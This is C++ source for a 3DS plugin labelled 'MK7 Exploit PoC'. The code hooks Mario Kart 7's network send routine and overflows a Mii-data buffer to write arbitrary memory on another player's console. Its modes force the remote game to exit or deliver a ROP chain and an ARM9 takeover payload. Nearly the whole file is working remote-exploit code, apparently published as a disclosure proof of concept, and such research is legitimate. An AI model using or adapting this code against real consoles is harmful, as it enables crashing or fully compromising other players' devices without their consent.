#include <3ds.h>
#include <CTRPluginFramework.hpp>
#include "PatternManager.hpp"
#include "OSDManager.hpp"
#include "rt.h"
#include "MK7NetworkBuffer.hpp"

#include <vector>
#include <string.h>

// Exploit modes, uncomment them to change which mode to use
//#define HAXMODE // Sends and triggers an ARM9 takeover exploit.
#define POCMODE // Causes the remote application to exit.

// This PoC does not provide the following files, they are left as an exercise to the reader ;)
#ifdef HAXMODE
#include "..\local\universal_otherapp.h"
#include "..\local\ropbin_eur.h"
#endif

namespace CTRPluginFramework
{
    // Hook struct for hooking into the game send buffer function
    RT_HOOK sendNetworkBufferHook;

    // New buffer for the network data. Needs to be extended in the local console as we can corrupt data by writing past it.
    u8 type9NewBuffer[0x800] = {0};

    extern "C" {
        void hookFuncCallback(MK7NetworkBuffer* netBuf, int bufferID);
        u32 g_hookFuncret;
    }

    // This function is called from Net::NetworkStationBufferManager::constructSendHeader_()+0xC4
    // From this asm function we jump to hookFuncCallback with arg0 = network buffer and arg1 = bufferID
    static void NAKED hookfunc() {
        __asm__ __volatile__
        (
            "PUSH            {R0-R3}\n"
            "MOV             R0, R1\n"
            "MOV             R1, R2\n"
            "BL              hookFuncCallback\n"
            "POP             {R0-R3}\n"
            "ADD             R2, R3, R0,LSL#1 \n"
            "LDR             R1, [R1,#0xC] \n"
            "LDR		     LR, =g_hookFuncret \n"
            "LDR		     PC, [LR] \n"
        );
    }

    #define STACKADDRONRECV 0x0FFFFA94 // Stack value when the function in the client returns
    #define PROPERBUFFERADDR 0x1700A000 // Proper buffer address for buffer1, we just set it to a valid address here, but in EUR games the proper address is 0x152E7BFC
    #define PROPERBUFFERSIZE 0xC0 // Proper buffer size for buffer1.
    #define ADDRPWNBUF 1 // BufferID of the local buffer that will be copied to buffer0 in the remote console
    #define PAYLOADBUF 0 // BufferID of the local buffer that will be copied to buffer1 in the remote console
    #define RETRYAMOUNT 1 // Amount of times the same part of the payload is sent before sending the next. It was found that doing it just one time is as (un)stable as doing it multiple times

    // Extend the buffer so we can write data past it without causing problems in the local console
    static u8* g_oldBuf;
    void changeToExtendedBuffer(MK7NetworkBuffer* netBuf) {
        if (netBuf->dataPtr == type9NewBuffer)
            return;
        g_oldBuf = netBuf->dataPtr;
        memcpy(type9NewBuffer, netBuf->dataPtr, netBuf->dataSize);
        netBuf->dataPtr = type9NewBuffer;
    }

    // Restore the changes made by the prevous function
    void restoreExtendedBuffer(MK7NetworkBuffer* netBuf) {
        netBuf->dataPtr = g_oldBuf;
        memcpy(netBuf->dataPtr, type9NewBuffer, netBuf->dataSize);
    }

    // Change the target address and total size of buffer1 by overflowing buffer0.
    // This allows the next buffer1 to be copied anywhere we want.
    void changeTargetAddress(MK7NetworkBuffer* netBuf, u32 address, u32 newSize) {
        netBuf->Clear();
        // Get a pointer to the out of bounds data, just after the buffer0
        u32* outofbounds = (u32*)((u32)netBuf->dataPtr + netBuf->dataSize);
        // The first 0x10 bytes after the buffer are unknown, just set them to 0
        outofbounds[0] = outofbounds[1] = outofbounds[2] = outofbounds[3] = 0;
        // Get a pointer where buffer1 will be located
        MK7NetworkBuffer* outofboundsBuffer = (MK7NetworkBuffer*)&outofbounds[4];
        // Set the arbitrary address and size where the buffer1 header location is
        outofboundsBuffer->bufferType = 0x9;
        outofboundsBuffer->dataPtr = (u8*)address;
        outofboundsBuffer->dataSize = newSize;

        // Increase the size of buffer0 by 0x1C bytes, enough to overwrite the parameters in buffer1 we just set
        netBuf->dataSize += 0x1C;
        netBuf->currentSize = netBuf->dataSize;
    }

    // Undo the changes made by the previous function (by reducing the buffer data size and no longer producing an overflow).
    void undoChangeTargetAddress(MK7NetworkBuffer* netBuf) {
        netBuf->dataSize -= 0x1C;
    }

    static u32* g_stackPwn;
    static u32 g_stackPwnSize;
    static const void* g_payload;
    static u32 g_payloadSize;
    static u32 g_payloadAddr;

    // Main function for setting where the payload will be copied in the remote console
    void setPayload(const void* payload, u32 payloadSize, u32 targetAddress) {
        g_payload = payload;
        g_payloadSize = payloadSize;
        g_payloadAddr = targetAddress;
    }

    // This function will be called every time an output buffer needs to be sent. There are 2 buffers (double buffer technique).
    // One of the buffers will be used to overwrite the target address in the other buffer.
    static u32 pwnState = 0;
    static u32 currTargetAddress;
    static u32 currRemSize;
    static u32 retryCounter = 0;
    static u32 exploitState = 0;
    void hookFuncCallback(MK7NetworkBuffer* netBuf, int bufferID) {
        // We use the buffer type 0x9, but we could use any other. This buffer contains mii data.
        if (netBuf->bufferType == 0x09) {
            // Pwnstate = 0 && buffer = buffer0 -> Set the buffer0 contents to overwrite the target address of buffer1
            if (pwnState == 0 && bufferID == ADDRPWNBUF) {

                // Extend the buffer0 in the local console, as otherwise we would be doing the exploit on ourselves.
                if (retryCounter == 0)
                    changeToExtendedBuffer(netBuf);
                else
                    undoChangeTargetAddress(netBuf);
                
                // Do the overflow, change where the payload will be copied in the remote console.
                changeTargetAddress(netBuf, g_payloadAddr, 0);
                currTargetAddress = g_payloadAddr;
                currRemSize = g_payloadSize;

                OSDTRACE("prg", "Sending payload: %.2f%%", 0.f)

                // Because of UDP, we do this operation 30 times before going to the next step, in case the packet was dropped
                if (++retryCounter == 30)
                {
                    pwnState = 1;
                    retryCounter = 0;
                }
            // Pwnstate = 0 && buffer = buffer1 -> Do not send anything, the overflow may have or not have happened yet in the remote console
            } else if (pwnState == 0 && bufferID == PAYLOADBUF) {
                netBuf->Clear();
            // Pwnstate = 1 -> Set the buffer1 contents with the payload that will be copied in the desired target address.
            // We set buffer0 as well as sometimes the buffer IDs in the remote console swap, and this seems to reduce the chances of this happening
            } else if (pwnState == 1 && bufferID == ADDRPWNBUF) {
                // Calculate the chunk of the payload to send and put it in the buffer, will be written in the desired address in the remote console
                u32 currSize = (currRemSize > 0xC0) ? 0xC0 : currRemSize;
                netBuf->Set((u8*)g_payload + (g_payloadSize - currRemSize), currSize);
            } else if (pwnState == 1 && bufferID == PAYLOADBUF) {
                
                // Calculate the chunk of the payload to send and put it in the buffer, will be written in the desired address in the remote console
                u32 currSize = (currRemSize > netBuf->dataSize) ? netBuf->dataSize : currRemSize;
                netBuf->Set((u8*)g_payload + (g_payloadSize - currRemSize), currSize);

                OSDTRACE("prg", "Sending payload: %.2f%%", (1.f - (currRemSize / (float)g_payloadSize)) * 100.f)

                // Because of UDP, we do this operation multiple times before going to the next step, in case the packet was dropped
                if (++retryCounter == RETRYAMOUNT)
                {
                    currRemSize -= currSize;
                    if (currRemSize == 0)
                        pwnState = 3;
                    else
                        pwnState = 2;
                    retryCounter = 0;
                }
            // Pwnstate = 2 -> Update the target address with the help of buffer0 to the next memory location.
            // This could have been simplified by merging pwnStates 0 and 2, but it works TM
            // For the same reason as before, we also fill buffer1 with data to reduce the chances of the buffer IDs swapping
            } else if (pwnState == 2 && bufferID == ADDRPWNBUF) {

                // Undo the target address and set the new one. We increment the target address so that we can copy
                // more data, until we have sent everything we want.
                undoChangeTargetAddress(netBuf);
                changeTargetAddress(netBuf, g_payloadAddr + (g_payloadSize - currRemSize), 0);

                if (++retryCounter == RETRYAMOUNT)
                {
                    pwnState = 1;
                    retryCounter = 0;
                }

            } else if (pwnState == 2 && bufferID == PAYLOADBUF) {
                u32 currSize = (currRemSize > 0xC0) ? 0xC0 : currRemSize;
                netBuf->Set((u8*)g_payload + (g_payloadSize - currRemSize), currSize);
            // PwnState = 3 -> Either go to the next exploit state (for example to overwrite the stack and trigger the ROP payload) or to
            // restore the proper values of buffer1 in the remote console.
            } else if (pwnState == 3 && bufferID == ADDRPWNBUF) {
#ifdef HAXMODE
                if (exploitState == 0) {
                    exploitState = 1;
                    undoChangeTargetAddress(netBuf);
                    setPayload(g_stackPwn, g_stackPwnSize, STACKADDRONRECV);
                    changeTargetAddress(netBuf, g_payloadAddr, 0);
                    currTargetAddress = g_payloadAddr;
                    currRemSize = g_payloadSize;
                    retryCounter = 0;
                    pwnState = 2;
                    return;
                }
#endif

                OSDTRACE("prg", "Sending payload: %.2f%%", 100.f)

                // Change the target address to a valid value and size, this will make the remote console stable by having a proper dataPtr
                // in buffer1. Once the game goes to a race, this will revert to the proper ones.
                undoChangeTargetAddress(netBuf);
                changeTargetAddress(netBuf, PROPERBUFFERADDR, PROPERBUFFERSIZE);

                if (++retryCounter == RETRYAMOUNT)
                { 
                    pwnState = 4;
                    retryCounter = 0;
                }
            // Pwnstate = 4 && buffer = buffer1 -> Do not send anything, the overflow may have or not have happened yet in the remote console
            } else if (pwnState == 3 && bufferID == PAYLOADBUF) {
                netBuf->Clear();
            // Pwnstate = 4 -> Restore the state of the local buffers (has no effect in the remote console). At this point the remote console
            // should have triggered the ROP and/or restored the valid values in buffer1 header
            } else if (pwnState == 4 && bufferID == ADDRPWNBUF) {
                undoChangeTargetAddress(netBuf);
                restoreExtendedBuffer(netBuf);

                // This POC does not implement "re-arming" the exploit, just set pwnState to 5 so it doesn't trigger again
                pwnState = 5;
            }
        }
    }

    // This function executes before the game runs.
    // Used to find the address of the buffer send function and hook into it.
    void    PatchProcess(FwkSettings &settings)
    {
        PatternManager pm;
        // Find the function in the local console to hook into.
        const u8 functionPattern[] = {0x80, 0x20, 0x83, 0xE0, 0x0C, 0x10, 0x91, 0xE5, 0xB4, 0x10, 0xC2, 0xE1, 0x01, 0x00, 0x00, 0xEA};
        pm.Add(functionPattern, 0x10, [](u32 addr) {
            rtInitHook(&sendNetworkBufferHook, addr, (u32)hookfunc);
            rtEnableHook(&sendNetworkBufferHook);
            g_hookFuncret = addr + 0x8;
            return true;
        });
        pm.Perform();
    }

    // Disable the hooks when going to the home menu
    void OnPluginToSwap(void) {
		rtDisableHook(&sendNetworkBufferHook);
	}

    // Enable the hooks when coming from the home menu
	void OnPluginFromSwap(void) {
		rtEnableHook(&sendNetworkBufferHook);
	}

    // This function is called after the game starts executing and CTRPF is ready.
    int     main(void)
    {
        OSD::Notify("MK7 Exploit PoC");
#ifdef POCMODE
        OSD::Notify("Mode: App Exit");
#endif
#ifdef HAXMODE
        OSD::Notify("Mode: ARM9 Takeover");
#endif

        // Send an arm9 takeover payload and a rop payload
        // Only the European build of the game with the 1.1 update preinstalled is supported, but it is possible to add support to other regions
        // arm9 takeover source: https://github.com/TuxSH/universal-otherapp
        // rop payload source: https://github.com/yellows8/3ds_ropkit
#ifdef HAXMODE
        u8* fullPayload = (u8*)malloc(0x8000 + payload_eur_bin_size + 0x100);
        // Copy the arm9 takeover payload to 0x16FF8000 in the remote console
        memcpy(fullPayload, otherapp_bin, otherapp_bin_size);
        // Copy the ROP to start the arm9 payload to 0x17000000 in the remote console
        memcpy(fullPayload + 0x8000, payload_eur_bin, payload_eur_bin_size);

        // Set the payload to be sent by hookFuncCallback
        setPayload(fullPayload, 0x8000 + payload_eur_bin_size + 0x100, 0x16FF8000);

        // Build stack modification payload to trigger the ROP payload. This will be sent after the main payload is sent
        // I could have used setPayload again in hookFuncCallback, or some sort of payload queue, but I use global variables
        // because this is just a POC.
        g_stackPwnSize = 0xC0;
        g_stackPwn = (u32*)malloc(g_stackPwnSize);
        g_stackPwn[0] = 0x00100620; // POP {R3-R5, PC}
        g_stackPwn[1] = 0x17000000 - (STACKADDRONRECV + 0x14);
        g_stackPwn[4] = 0x001144E8; // ADD SP, SP, R3; POP {PC}
#endif
        // Modify the application status value to force the remote application to close.
        // This address should work on any build of the game.
#ifdef POCMODE
        u32 forceAppClose = 0x00010000;
        setPayload(&forceAppClose, 4, 0x6664D4);
#endif
        // Wait for process exit.
        Process::WaitForExit();

        // Exit plugin
        return (0);
    }
}
